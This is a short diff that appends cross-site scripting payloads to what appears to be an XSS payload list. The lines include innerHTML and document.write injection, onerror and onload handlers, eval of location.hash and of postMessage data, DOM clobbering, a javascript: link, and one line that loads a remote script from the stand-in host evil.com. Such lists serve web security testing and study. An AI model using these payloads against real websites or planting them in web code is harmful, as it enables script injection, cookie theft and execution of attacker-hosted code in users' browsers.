@@ -390,3 +390,17 @@ document.body.innerHTML = `<script src="${localStorage.getItem('script_src')}">`
 localStorage.setItem('autorun_script', '<script>alert(document.cookie)</script>');
 document.write(localStorage.getItem('autorun_script'));
 </script> 
+
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<script>document.write('<svg onload=alert(1)>')</script>
+<script>document.body.appendChild(document.createElement('script')).src='http://evil.com/xss.js'</script>
+<script>localStorage.setItem('xss','<img src=x onerror=alert(1)>');document.body.innerHTML=localStorage.getItem('xss');</script>
+<script>sessionStorage.setItem('xss','<svg onload=alert(1)>');document.body.innerHTML=sessionStorage.getItem('xss');</script>
+<script>location.hash='#<img src=x onerror=alert(1)>'</script>
+<script>eval(location.hash.substring(1))</script>
+<script>window.postMessage('<img src=x onerror=alert(1)>','*')</script>
+<script>window.addEventListener('message',e=>eval(e.data))</script>
+<form id="test"></form><script>alert(test)</script>
+<img src="x" id="test"/><script>alert(test.id)</script>
+<a id="test" href="javascript:alert(1)">click</a>
+<script>test.click()</script>
